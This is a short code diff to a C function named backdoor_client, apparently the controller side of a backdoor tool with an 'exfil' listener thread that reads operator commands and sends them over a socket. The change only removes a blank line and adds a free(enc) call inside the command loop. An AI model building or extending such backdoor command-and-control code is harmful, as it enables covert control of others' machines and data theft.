@@ -45,7 +45,6 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	// exfil thread
 	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
 	
-
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
 	{
@@ -53,6 +52,8 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 		int length;
 
 		length = strlen(command) + 1;
+
+		free(enc);
 
 		frame = buildTransmission(command, &length, CMD_TYP);
 		sendto(sock, frame, length, 0, (struct sockaddr *)&saddr, sizeof(saddr));
